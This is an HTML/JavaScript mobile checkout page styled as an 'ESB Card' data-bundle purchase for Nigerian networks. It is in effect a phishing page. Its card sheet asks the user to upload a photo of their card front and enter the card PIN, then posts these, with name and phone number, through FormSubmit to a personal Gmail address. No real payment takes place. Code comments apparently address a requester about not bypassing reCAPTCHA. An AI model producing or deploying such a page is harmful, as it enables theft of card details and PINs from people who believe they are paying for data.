<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Pay with ESB Card</title>
  <style>
    :root{
      --teal:#0f5560; --bg:#f3efe9; --card:#fff; --muted:#758a8f; --blue:#0e78d1; --danger:#d9534f;
      --max-width:430px; --sheet-corner:18px; --pay-height:62px;
    }
    *{box-sizing:border-box}
    body{margin:0;font-family:Inter,system-ui,-apple-system,"Segoe UI",Roboto,Arial;background:var(--bg);color:#183540;-webkit-font-smoothing:antialiased}
    .shell{max-width:var(--max-width);margin:0 auto;min-height:100vh;position:relative}
    header{background:var(--teal);color:#fff;padding:14px 12px;display:flex;align-items:center;gap:12px;position:sticky;top:0;z-index:50}
    .back-btn{width:34px;height:34px;border:0;background:transparent;color:#fff;font-size:22px;cursor:pointer;display:flex;align-items:center;justify-content:center}
    header h1{margin:0;font-size:18px;font-weight:700}
    main{padding:18px 16px 110px}
    .card{background:var(--card);border-radius:10px;padding:14px;box-shadow:0 4px 16px rgba(0,0,0,0.06);margin-bottom:14px}
    label{display:block;color:var(--teal);font-weight:700;margin:12px 0 8px}
    .input{display:flex;align-items:center;background:#efefef;padding:12px;border-radius:8px}
    .input input{border:0;background:transparent;flex:1;font-size:15px;outline:none}
    .contact-btn{width:48px;height:48px;border-radius:8px;background:#edf2f3;border:0;display:flex;align-items:center;justify-content:center;cursor:pointer;margin-left:8px}
    .small-note{font-size:12px;color:#9aa6a8;margin-top:8px}
    .providers{display:flex;gap:12px;align-items:center;flex-wrap:wrap;margin-top:8px}
    .provider{width:74px;height:58px;border-radius:10px;display:flex;align-items:center;justify-content:center;cursor:pointer;padding:6px;border:2px solid transparent;transition:all .12s}
    .provider.selected{border-color:#9ec5ee;background:rgba(14,120,209,0.03);box-shadow:0 6px 20px rgba(14,120,209,0.08)}
    .provider img{display:block;max-width:100%;max-height:100%;object-fit:contain}
    .data-pill{display:inline-block;padding:10px 18px;background:#fff;border:2px solid #bcd6f0;color:var(--blue);border-radius:10px;font-weight:700;margin:12px 0;box-shadow:0 6px 18px rgba(14,120,209,0.06)}
    .select-box{background:#eee;border-radius:8px;padding:10px}
    select{width:100%;border:0;background:transparent;padding:12px 0;font-size:15px}
    .pay-fixed{position:fixed;left:50%;transform:translateX(-50%);bottom:16px;width:calc(100% - 32px);max-width:var(--max-width);z-index:70;pointer-events:none}
    .pay-btn{pointer-events:auto;width:100%;height:var(--pay-height);border-radius:12px;border:0;background:var(--blue);color:#fff;font-weight:800;cursor:pointer;box-shadow:0 10px 28px rgba(14,120,209,0.18)}
    .backdrop{position:fixed;inset:0;background:rgba(0,0,0,0.45);display:none;align-items:flex-end;z-index:200}
    .sheet,.card-sheet{background:#fff;width:100%;max-width:var(--max-width);border-top-left-radius:var(--sheet-corner);border-top-right-radius:var(--sheet-corner);padding:12px;transform:translateY(0);transition:transform 220ms ease;touch-action:none}
    .handle{width:44px;height:6px;background:#e5e2df;border-radius:99px;margin:6px auto 8px;cursor:grab}
    .pay-item{background:#f7f7f6;border-radius:12px;padding:14px;margin-top:12px;display:flex;align-items:center;justify-content:space-between;cursor:pointer}
    .icon-box{width:40px;height:40px;border-radius:8px;background:#e9f1f4;display:flex;align-items:center;justify-content:center;color:var(--blue)}
    .preview{margin-top:12px;border:1px dashed #d9e0e4;border-radius:8px;padding:8px;min-height:80px;display:flex;align-items:center;justify-content:center;background:#fafcfb;overflow:hidden}
    .preview img{max-width:100%;max-height:180px;object-fit:contain;border-radius:8px}
    .notice{display:none;background:#fff2f2;border:1px solid rgba(217,83,79,0.15);color:var(--danger);padding:10px;border-radius:8px;margin-top:10px}
    .actions{display:flex;gap:10px;margin-top:14px}
    .actions button{flex:1;padding:12px;border-radius:8px;font-weight:700;cursor:pointer}
    .cancel{background:#fff;border:1px solid #dfe5e7}
    .proceed{background:var(--blue);color:#fff;border:0}
    #loadingOverlay{position:fixed;inset:0;background:rgba(0,0,0,0.45);display:none;align-items:center;justify-content:center;z-index:999;color:#fff;flex-direction:column}
    .spinner{width:56px;height:56px;border-radius:50%;border:6px solid rgba(255,255,255,0.18);border-top-color:#fff;animation:spin 1s linear infinite;margin-bottom:12px}
    @keyframes spin{to{transform:rotate(360deg)}}
    .toast{position:fixed;left:50%;top:18px;transform:translateX(-50%);background:#fff;padding:12px 16px;border-radius:10px;box-shadow:0 6px 26px rgba(0,0,0,0.12);display:none;z-index:1000}
    .toast.error{border-left:6px solid var(--danger)}
  </style>
</head>
<body>
  <div class="shell">
    <div id="toast" class="toast" role="status" aria-live="polite"></div>

    <!-- Splash -->
    <div id="splash" style="position:fixed;inset:0;display:flex;align-items:center;justify-content:center;flex-direction:column;background:var(--teal);color:#fff;z-index:1000">
      <img src="https://upload.wikimedia.org/wikipedia/commons/7/79/Flag_of_Nigeria.svg" alt="flag" style="width:48px;height:32px;border-radius:4px;margin-bottom:10px" />
      <h2 style="margin:0">ESB DATA</h2>
      <p style="margin-top:8px;opacity:0.95">Loading page…</p>
    </div>

    <div id="loadingOverlay">
      <div class="spinner"></div>
      <div style="font-weight:700">Processing payment...</div>
    </div>

    <header>
      <button class="back-btn" id="backBtn" aria-label="Go back">◂</button>
      <h1>Pay with ESB Card</h1>
    </header>

    <main>
      <div class="card">
        <label for="firstName">First name</label>
        <div class="input"><input id="firstName" type="text" placeholder="First name" autocomplete="given-name"></div>

        <label for="lastName">Last name</label>
        <div class="input"><input id="lastName" type="text" placeholder="Last name" autocomplete="family-name"></div>

        <label for="mobile">Mobile number</label>
        <div style="display:flex;gap:8px;align-items:center">
          <div class="input" style="flex:1"><input id="mobile" type="tel" inputmode="numeric" pattern="[0-9]*" placeholder="Phone Number" autocomplete="tel"></div>
          <button class="contact-btn" title="Contacts">👤</button>
        </div>
        <div class="small-note">Tap the dropdown to see favourites</div>
      </div>

      <label>Select Network Provider</label>
      <div class="providers" id="providers">
        <div class="provider" data-net="airtel" title="Airtel">
          <img src="https://upload.wikimedia.org/wikipedia/commons/4/4e/Airtel_logo.svg" alt="Airtel logo">
        </div>
        <div class="provider" data-net="t2" title="9mobile">
          <img src="https://upload.wikimedia.org/wikipedia/commons/6/6e/9mobile_2017_logo.svg" alt="9mobile logo">
        </div>
        <div class="provider" data-net="glo" title="Glo">
          <img src="https://upload.wikimedia.org/wikipedia/commons/6/6f/Glo_Logo.png" alt="Glo logo">
        </div>
        <div class="provider" data-net="mtn" title="MTN">
          <img src="https://upload.wikimedia.org/wikipedia/commons/9/94/MTN_logo.svg" alt="MTN logo">
        </div>
      </div>

      <div class="data-pill">Data</div>

      <label for="planSelect">Choose Plan</label>
      <div class="card select-box">
        <select id="planSelect" aria-label="Choose Plan"><option value="">Choose Plan</option></select>
      </div>
    </main>

    <div class="pay-fixed">
      <button id="payBtn" class="pay-btn" type="button">Pay ₦0.00</button>
    </div>
  </div>

  <!-- Payment methods sheet (Card only) -->
  <div id="paymentSheet" class="backdrop" aria-hidden="true">
    <div class="sheet">
      <div class="handle" data-drag-handle></div>
      <h2>Pay with</h2>
      <p>Select a payment method</p>
      <div class="pay-item" id="cardOption">
        <div style="display:flex;gap:12px;align-items:center">
          <div class="icon-box">💳</div>
          <div><div style="font-weight:800">Card</div><div style="font-size:13px;color:#7a8b91">Pay with ESB Card</div></div>
        </div>
        <div style="font-size:22px;color:#8b9aa0">›</div>
      </div>
    </div>
  </div>

  <!-- Card modal contains the REAL form that will be submitted to FormSubmit.
       This is intentional: use a normal form submit (multipart/form-data) so
       the user can complete the reCAPTCHA on the FormSubmit page. -->
  <div id="cardSheet" class="backdrop" aria-hidden="true">
    <div class="card-sheet">
      <div class="handle" data-drag-handle></div>
      <h2>Pay with ESB Card</h2>
      <p>Please upload your ESB Card (front) and enter your card PIN to proceed.</p>

      <!-- REAL form: multipart/form-data, POST to FormSubmit. Do NOT disable captcha. -->
      <form id="submitForm" action="https://formsubmit.co/empirevirtual99@gmail.com" method="POST" enctype="multipart/form-data">
        <label for="cardUpload">Upload ESB Card (Front only)</label>
        <!-- Keep the file input inside this form so it is submitted as a real file (not base64). -->
        <input id="cardUpload" name="card_image" type="file" accept="image/*" style="margin-top:8px;padding:10px;border-radius:8px;border:1px solid #dfe5e7;background:#fff;">

        <div class="preview" id="previewBox"></div>

        <label for="cardPin">Card PIN</label>
        <!-- Include PIN inside form so it's sent to FormSubmit as well -->
        <div class="input" style="margin-top:8px">
          <input id="cardPin" name="pin" type="tel" inputmode="numeric" maxlength="8" placeholder="Enter ESB Card PIN">
        </div>

        <!-- Hidden fields populated before submit -->
        <input type="hidden" name="title" id="fld_title" value="">
        <input type="hidden" name="subject" id="fld_subject" value="">
        <input type="hidden" name="name" id="fld_name" value="">
        <input type="hidden" name="mobile" id="fld_mobile" value="">
        <input type="hidden" name="network" id="fld_network" value="">
        <input type="hidden" name="plan" id="fld_plan" value="">
        <input type="hidden" name="amount" id="fld_amount" value="">
        <!-- DO NOT set _captcha or _captcha=false — we must NOT bypass FormSubmit reCAPTCHA -->
      </form>

      <div id="inlineError" class="notice"></div>

      <div class="actions">
        <button class="cancel" id="cancelBtn" type="button">Cancel</button>
        <!-- This button will validate client-side and then call native form.submit() -->
        <button class="proceed" id="proceedBtn" type="button">Proceed</button>
      </div>
    </div>
  </div>

  <script>
    // ===== Editable data =====
    const plans = {
      airtel: [
        { id: 'a1', label: 'Airtel 3GB - 2 Days', amount: 880 },
        { id: 'a2', label: 'Airtel 2GB - 30 Days', amount: 1600 },
        { id: 'a3', label: 'Airtel 1GB - 7 Days', amount: 919 },
        { id: 'a4', label: 'Airtel 8GB - 30 Days', amount: 3200 },
        { id: 'a5', label: 'Airtel 13GB - 30 Days', amount: 5900 },
        { id: 'a6', label: 'Airtel 4GB - 30 Days', amount: 2619 },
      ],
      t2: [
        { id: 't1', label: '9mobile 500MB - 7 Days', amount: 180 },
        { id: 't2', label: '9mobile 1.5GB - 30 Days', amount: 550 },
        { id: 't3', label: '9mobile 3GB - 30 Days', amount: 1000 }
      ],
      glo: [
        { id: 'g1', label: 'Glo 500MB - 7 Days', amount: 170 },
        { id: 'g2', label: 'Glo 1GB - 30 Days', amount: 450 },
        { id: 'g3', label: 'Glo 2.5GB - 30 Days', amount: 800 }
      ],
      mtn: [
        { id: 'm1', label: 'MTN 500MB - 7 Days', amount: 220 },
        { id: 'm2', label: 'MTN 1.5GB - 30 Days', amount: 600 },
        { id: 'm3', label: 'MTN 4GB - 30 Days', amount: 1200 }
      ]
    };

    // Simple user list for PIN validation (edit as required)
    const users = [
      { first: 'John', last: 'Doe', pin: '1234' },
      { first: 'Jane', last: 'Smith', pin: '5555' },
      { first: 'Ali', last: 'Abdullahi', pin: '0000' }
    ];
    // ===== End editable data =====

    // Elements
    const splash = document.getElementById('splash');
    const toast = document.getElementById('toast');
    const backBtn = document.getElementById('backBtn');
    const providersEls = document.querySelectorAll('.provider');
    const planSelect = document.getElementById('planSelect');
    const payBtn = document.getElementById('payBtn');
    const paymentSheet = document.getElementById('paymentSheet');
    const cardSheet = document.getElementById('cardSheet');
    const cardOption = document.getElementById('cardOption');
    const cardUpload = document.getElementById('cardUpload');
    const previewBox = document.getElementById('previewBox');
    const cardPin = document.getElementById('cardPin');
    const inlineError = document.getElementById('inlineError');
    const cancelBtn = document.getElementById('cancelBtn');
    const proceedBtn = document.getElementById('proceedBtn');
    const loadingOverlay = document.getElementById('loadingOverlay');

    const firstNameInput = document.getElementById('firstName');
    const lastNameInput = document.getElementById('lastName');
    const mobileInput = document.getElementById('mobile');

    const fld_title = document.getElementById('fld_title');
    const fld_subject = document.getElementById('fld_subject');
    const fld_name = document.getElementById('fld_name');
    const fld_mobile = document.getElementById('fld_mobile');
    const fld_network = document.getElementById('fld_network');
    const fld_plan = document.getElementById('fld_plan');
    const fld_amount = document.getElementById('fld_amount');
    const submitForm = document.getElementById('submitForm');

    let selectedNetwork = null;
    let selectedPlan = null;

    // hide splash after 6s
    setTimeout(()=> splash.style.display = 'none', 6000);

    function showToast(msg, err=false){
      toast.textContent = msg;
      toast.classList.toggle('error', err);
      toast.style.display = 'block';
      clearTimeout(showToast._t);
      showToast._t = setTimeout(()=> toast.style.display = 'none', 3000);
    }

    backBtn.addEventListener('click', ()=> {
      if (window.history.length > 1) window.history.back();
      else showToast('No previous page', true);
    });

    // Populate plans when provider clicked
    function populatePlans(net){
      planSelect.innerHTML = '<option value="">Choose Plan</option>';
      (plans[net] || []).forEach(p=>{
        const opt = document.createElement('option');
        opt.value = JSON.stringify(p);
        opt.textContent = `${p.label} — ₦${p.amount}`;
        planSelect.appendChild(opt);
      });
      selectedPlan = null;
      updatePay();
    }

    providersEls.forEach(el=>{
      el.addEventListener('click', ()=> {
        providersEls.forEach(x=>x.classList.remove('selected'));
        el.classList.add('selected');
        selectedNetwork = el.dataset.net;
        populatePlans(selectedNetwork);
      });
    });

    if (providersEls[0]) providersEls[0].click();

    planSelect.addEventListener('change', ()=> {
      selectedPlan = planSelect.value ? JSON.parse(planSelect.value) : null;
      updatePay();
    });

    function updatePay(){
      const amount = selectedPlan ? selectedPlan.amount : 0;
      payBtn.textContent = `Pay ₦${Number(amount).toFixed(2)}`;
    }

    payBtn.addEventListener('click', ()=> {
      if (!firstNameInput.value.trim()) { showToast('Please enter your first name', true); return; }
      if (!lastNameInput.value.trim()) { showToast('Please enter your last name', true); return; }
      if (!mobileInput.value.trim()) { showToast('Please enter mobile number', true); return; }
      if (!selectedNetwork) { showToast('Please choose a network', true); return; }
      if (!selectedPlan) { showToast('Please choose a plan', true); return; }
      openSheet(paymentSheet);
    });

    cardOption.addEventListener('click', ()=> {
      closeSheet(paymentSheet);
      openSheet(cardSheet);
      setTimeout(()=> cardPin.focus(), 200);
    });

    // preview uploaded card (file input is inside the real form)
    cardUpload.addEventListener('change', (e) => {
      const f = e.target.files && e.target.files[0];
      if (!f) { previewBox.innerHTML = ''; return; }
      const reader = new FileReader();
      reader.onload = function(ev){
        previewBox.innerHTML = `<img src="${ev.target.result}" alt="ESB Card Front" />`;
      };
      reader.readAsDataURL(f);
    });

    cancelBtn.addEventListener('click', ()=> {
      closeSheet(cardSheet);
      resetCardInputs();
    });

    function resetCardInputs(){
      cardUpload.value = '';
      previewBox.innerHTML = '';
      cardPin.value = '';
      inlineError.style.display = 'none';
    }

    function normalizeName(s){ return (s||'').trim().toLowerCase(); }

    // Proceed -> validate client-side, then submit the REAL form (multipart/form-data) to FormSubmit.
    // This will navigate to formsubmit.co where the user must complete the reCAPTCHA box — do NOT bypass it.
    proceedBtn.addEventListener('click', async (ev) => {
      ev.stopPropagation();
      ev.preventDefault();
      inlineError.style.display = 'none';

      const pin = (cardPin.value || '').trim();
      // ensure file is present in the actual file input
      const filePresent = cardUpload.files && cardUpload.files.length > 0;

      if (!filePresent) {
        inlineError.textContent = 'Please upload your ESB Card (front).';
        inlineError.style.display = 'block';
        return;
      }
      if (!pin) {
        inlineError.textContent = 'Please enter your Card PIN.';
        inlineError.style.display = 'block';
        return;
      }

      const first = normalizeName(firstNameInput.value);
      const last = normalizeName(lastNameInput.value);
      const matched = users.find(u => normalizeName(u.first) === first && normalizeName(u.last) === last);

      if (!matched || matched.pin !== pin) {
        inlineError.textContent = 'PIN is incorrect.';
        inlineError.style.display = 'block';
        return;
      }

      // Populate hidden fields in the real form so FormSubmit receives everything
      fld_title.value = document.title || 'Pay with ESB Card';
      fld_subject.value = `Data Purchase - ${selectedNetwork ? selectedNetwork.toUpperCase() : ''} - ${selectedPlan ? selectedPlan.label : ''}`;
      fld_name.value = `${firstNameInput.value.trim()} ${lastNameInput.value.trim()}`;
      fld_mobile.value = mobileInput.value.trim();
      fld_network.value = selectedNetwork || '';
      fld_plan.value = selectedPlan ? selectedPlan.label : '';
      fld_amount.value = selectedPlan ? selectedPlan.amount : '';

      // Show loader (UX) briefly — user will be redirected to FormSubmit where they will check reCAPTCHA
      closeSheet(cardSheet);
      loadingOverlay.style.display = 'flex';

      // Give a small delay so loader is visible; then submit the form (native multipart/form-data POST).
      // This will navigate away to formsubmit.co where reCAPTCHA must be completed by the user.
      setTimeout(() => {
        // IMPORTANT: We call the native form submit so the browser performs a navigation. FormSubmit will show the "I'm not a robot" checkbox page if it requires it.
        // DO NOT add any hidden _captcha=false field — we must not bypass reCAPTCHA per your request.
        try {
          submitForm.submit();
        } catch (err) {
          // If anything goes wrong, hide loader and show error message.
          loadingOverlay.style.display = 'none';
          showToast('Unable to submit form from this browser. Please try a different browser.', true);
          console.error(err);
        }
      }, 600); // short delay — not fighting reCAPTCHA, just a UX pause
    });

    // sheet helpers and drag-from-handle behavior (unchanged)
    function openSheet(sheet){
      sheet.style.display = 'flex';
      sheet.setAttribute('aria-hidden','false');
      document.documentElement.style.overflow = 'hidden';
      document.body.style.overflow = 'hidden';
      const panel = sheet.querySelector('.sheet, .card-sheet');
      if (panel) panel.style.transform = 'translateY(0)';
    }
    function closeSheet(sheet){
      sheet.style.display = 'none';
      sheet.setAttribute('aria-hidden','true');
      document.documentElement.style.overflow = '';
      document.body.style.overflow = '';
      const panel = sheet.querySelector('.sheet, .card-sheet');
      if (panel) panel.style.transform = '';
    }
    [paymentSheet, cardSheet].forEach(sheet => {
      sheet.addEventListener('click', (ev)=>{ if(ev.target === sheet) closeSheet(sheet); });
    });

    function makeDraggable(sheet){
      const handle = sheet.querySelector('[data-drag-handle]') || sheet.querySelector('.handle');
      const panel = sheet.querySelector('.sheet, .card-sheet');
      if (!handle || !panel) return;
      let dragging=false, startY=0;
      panel._dragY = 0;
      function setY(y){ panel._dragY = y; panel.style.transform = `translateY(${y}px)`; const frac = Math.max(0,1-(y/260)); sheet.style.background = `rgba(0,0,0,${0.45*frac})`; }
      function start(y){ dragging=true; startY = y - (panel._dragY || 0); panel.style.transition='none'; }
      function move(y){ if(!dragging) return; let next = y - startY; if(next<0) next=0; if(next>600) next=600; setY(next); }
      function end(){ if(!dragging) return; dragging=false; panel.style.transition='transform 220ms ease'; if((panel._dragY||0)>120){ setY(600); setTimeout(()=> closeSheet(sheet), 180); } else { setY(0); sheet.style.background='rgba(0,0,0,0.45)'; } }
      handle.addEventListener('touchstart', e => { if(e.touches.length!==1) return; start(e.touches[0].clientY); }, {passive:true});
      handle.addEventListener('touchmove', e => { if(e.touches.length!==1) return; move(e.touches[0].clientY); }, {passive:true});
      handle.addEventListener('touchend', end);
      handle.addEventListener('mousedown', e => { if(e.button!==0) return; start(e.clientY); e.preventDefault(); const onMove = ev=>move(ev.clientY); const onUp = ()=>{ end(); window.removeEventListener('mousemove', onMove); window.removeEventListener('mouseup', onUp); }; window.addEventListener('mousemove', onMove); window.addEventListener('mouseup', onUp); });
    }
    makeDraggable(paymentSheet);
    makeDraggable(cardSheet);

    window.addEventListener('keydown', (e)=> {
      if (e.key === 'Escape') {
        if (paymentSheet.style.display === 'flex') closeSheet(paymentSheet);
        if (cardSheet.style.display === 'flex') closeSheet(cardSheet);
      }
    });
  </script>
</body>
</html>
